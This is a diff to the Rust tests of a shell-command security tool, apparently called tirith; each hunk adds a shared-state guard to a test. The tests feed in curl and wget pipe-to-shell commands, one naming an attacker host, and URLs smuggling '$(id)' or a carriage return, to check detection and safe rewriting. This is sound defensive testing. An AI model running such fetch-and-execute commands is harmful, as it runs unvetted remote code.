@@ -1238,6 +1238,7 @@ mod tests {
 
     #[test]
     fn generic_public_apis_are_guidance_only_even_for_a_stamped_verdict() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let ctx = default_exec_context("tar -xzf archive.tar.gz", ShellType::Posix);
         let mut verdict = verdict_with(vec![finding(RuleId::ArchiveExtract)]);
         verdict.agent_origin = Some(crate::agent_origin::AgentOrigin::human(false));
@@ -1268,6 +1269,7 @@ mod tests {
     #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
     #[test]
     fn internal_exact_path_without_a_stamped_origin_fails_to_guidance_only() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let ctx = default_exec_context(
             "curl -fsSL https://example.com/install.sh | bash",
             ShellType::Posix,
@@ -1297,6 +1299,7 @@ mod tests {
     #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
     #[test]
     fn producer_owned_cli_inline_api_can_emit_a_verified_pipe_runner() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let ctx = default_exec_context(
             "curl -fsSL https://example.com/install.sh | bash",
             ShellType::Posix,
@@ -1317,6 +1320,7 @@ mod tests {
     #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
     #[test]
     fn non_exec_analysis_context_cannot_emit_an_executable_pipe_runner() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for invalid_context in ["scan_context", "raw_bytes", "file_path"] {
             let mut ctx = default_exec_context(
                 "curl -fsSL https://example.com/install.sh | bash",
@@ -1362,6 +1366,7 @@ mod tests {
     #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
     #[test]
     fn delayed_reinvocation_requires_the_tirith_program_name() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         assert!(is_tirith_runner_path(Path::new("/usr/local/bin/tirith")));
         assert!(!is_tirith_runner_path(Path::new("/usr/local/bin/foo")));
         assert!(!is_tirith_runner_path(Path::new(
@@ -1388,6 +1393,7 @@ mod tests {
     #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
     #[test]
     fn verified_suggestions_reuse_original_policy_snapshot_after_file_change() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let repo = tempfile::tempdir().expect("temp repo");
         std::fs::create_dir_all(repo.path().join(".git")).expect("git marker");
         let policy_dir = repo.path().join(".tirith");
@@ -1518,6 +1524,7 @@ mod tests {
 
     #[test]
     fn retained_info_findings_never_make_archive_or_dotfile_guidance_executable() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for (command, rule_id, rule_name) in [
             (
                 "tar -xzf archive.tar.gz",
@@ -1563,6 +1570,7 @@ mod tests {
     #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
     #[test]
     fn agent_rule_denial_blocks_raw_allow_candidate() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let ctx = default_exec_context(
             "curl -fsSL https://example.com/install.sh | bash",
             ShellType::Posix,
@@ -1623,6 +1631,7 @@ mod tests {
     #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
     #[test]
     fn curl_pipe_bash_rewrites_to_hardened_capsule_runner() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let cmd = "curl -fsSL https://example.com/install.sh | bash";
         let v = verdict_with(vec![finding(RuleId::CurlPipeShell)]);
         let s = suggest(cmd, ShellType::Posix, &v);
@@ -1639,6 +1648,7 @@ mod tests {
     #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
     #[test]
     fn common_curl_body_flags_keep_the_typed_rewrite() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let cmd = "curl -fsSL https://example.com/install.sh | bash";
         let v = verdict_with(vec![finding(RuleId::CurlPipeShell)]);
         let s = suggest(cmd, ShellType::Posix, &v);
@@ -1652,6 +1662,7 @@ mod tests {
     #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
     #[test]
     fn curl_rewrite_requires_matching_status_and_redirect_semantics() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for command in [
             "curl https://example.com/install.sh | bash",
             "curl -f https://example.com/install.sh | bash",
@@ -1681,6 +1692,7 @@ mod tests {
     #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
     #[test]
     fn pipe_rewrite_is_guidance_only_without_immutable_self_reinvocation() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let ctx = default_exec_context(
             "curl -fsSL https://example.com/install.sh | bash",
             ShellType::Posix,
@@ -1696,6 +1708,7 @@ mod tests {
     #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
     #[test]
     fn emitted_absolute_runner_ignores_a_planted_first_path_tirith() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         use std::os::unix::fs::PermissionsExt as _;
 
         let fixture = tempfile::tempdir().expect("PATH-shadow fixture");
@@ -1737,6 +1750,7 @@ mod tests {
     #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
     #[test]
     fn emitted_capsule_runner_reanalyzes_allow_with_original_policy_snapshot() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let ctx = default_exec_context(
             "curl -fsSL https://example.com/install.sh | bash",
             ShellType::Posix,
@@ -1773,6 +1787,7 @@ mod tests {
     #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
     #[test]
     fn tls_http_pipe_chain_is_guidance_only_without_tool_option_proof() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let ctx = default_exec_context(
             "curl -k -fsSL http://attacker.invalid/script | bash",
             ShellType::Posix,
@@ -1796,6 +1811,7 @@ mod tests {
     #[cfg(not(all(target_os = "linux", target_arch = "x86_64")))]
     #[test]
     fn pipe_to_shell_is_guidance_only_without_runner_support() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let cmd = "curl -fsSL https://example.com/install.sh | bash";
         let v = verdict_with(vec![finding(RuleId::CurlPipeShell)]);
         let s = suggest(cmd, ShellType::Posix, &v);
@@ -1918,6 +1934,7 @@ mod tests {
 
     #[test]
     fn powershell_pipe_rewrite_is_guidance_only_without_call_operator_model() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let cmd = "curl -fsSL 'https://example.com/a''b' | bash";
         let v = verdict_with(vec![finding(RuleId::CurlPipeShell)]);
         let s = suggest(cmd, ShellType::PowerShell, &v);
@@ -2056,6 +2073,7 @@ mod tests {
 
     #[test]
     fn shell_single_quote_refuses_newline_and_nul() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // Newline / NUL can't live in a single-token single-quoted string.
         assert_eq!(shell_single_quote("a\nb"), None);
         assert_eq!(shell_single_quote("a\0b"), None);
@@ -2072,6 +2090,7 @@ mod tests {
     #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
     #[test]
     fn single_quoted_dollar_syntax_is_literal_and_round_trips() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let sc = pipe_suggestion(
             "curl -fsSL 'https://example.com/$(id)' | bash",
             ShellType::Posix,
@@ -2098,12 +2117,14 @@ mod tests {
     #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
     #[test]
     fn dynamic_unquoted_url_is_guidance_only() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         assert!(pipe_suggestion("curl -fsSL $URL | bash", ShellType::Posix).is_none());
     }
 
     #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
     #[test]
     fn carriage_return_host_mutation_is_rejected_not_sanitized() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let cmd = "curl -fsSL 'https://exa\rmple.com/install.sh' | bash";
         assert!(pipe_suggestion(cmd, ShellType::Posix).is_none());
     }
@@ -2111,6 +2132,7 @@ mod tests {
     #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
     #[test]
     fn posix_escaped_space_url_is_rejected_as_non_exact_url() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let cmd = r"curl -fsSL https://example.com/a\ b | bash";
         assert!(pipe_suggestion(cmd, ShellType::Posix).is_none());
     }
@@ -2118,6 +2140,7 @@ mod tests {
     #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
     #[test]
     fn wget_requires_an_explicit_stdout_body_shape() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let cmd = "wget -qO- 'https://example.com/$(id)' | sh";
         let v = verdict_with(vec![finding(RuleId::WgetPipeShell)]);
         let s = suggest(cmd, ShellType::Posix, &v);
@@ -2135,6 +2158,7 @@ mod tests {
     #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
     #[test]
     fn posix_embedded_single_quote_round_trips() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let cmd = r#"curl -fsSL "https://example.com/a'b" | bash"#;
         let sc = pipe_suggestion(cmd, ShellType::Posix).expect("literal URL rewrite");
         assert!(
@@ -2146,6 +2170,7 @@ mod tests {
     #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
     #[test]
     fn supported_shells_are_preserved_as_typed_stdin_interpreters() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for (sink, shell) in [
             ("sh", ShellType::Posix),
             ("bash", ShellType::Posix),
@@ -2168,6 +2193,7 @@ mod tests {
     #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
     #[test]
     fn fish_bare_backslash_escapes_are_always_guidance_only() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // Fish gives bare backslashes semantic escape behavior (including
         // control-producing forms). The safe rewriter deliberately declines the
         // entire class instead of maintaining a second, partial Fish parser.
@@ -2214,6 +2240,7 @@ mod tests {
     #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
     #[test]
     fn fish_generated_literal_matches_runtime_argv_when_fish_is_installed() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let Ok(fish) = crate::trusted_child::resolve_ambient("fish") else {
             eprintln!("skipping: Fish is not installed as a trusted executable");
             return;
@@ -2237,6 +2264,7 @@ mod tests {
     #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
     #[test]
     fn posix_shell_s_double_dash_operands_preserve_exact_argv_identity() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let operands = [
             "feature",
             "space bearing",
@@ -2278,6 +2306,7 @@ mod tests {
     #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
     #[test]
     fn unproven_fetcher_body_streams_remain_guidance_only() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for (command, rule_id) in [
             (
                 "http https://example.com/install.sh | bash",
@@ -2313,6 +2342,7 @@ mod tests {
     #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
     #[test]
     fn unsupported_interpreter_args_remain_guidance_only() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         assert!(pipe_suggestion(
             "curl -fsSL https://example.com/install.sh | bash -e",
             ShellType::Posix
@@ -2328,6 +2358,7 @@ mod tests {
     #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
     #[test]
     fn source_or_sink_environment_prefix_is_guidance_only() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         assert!(pipe_suggestion(
             "HTTPS_PROXY=https://proxy.example curl -fsSL https://example.com/install.sh | bash",
             ShellType::Posix
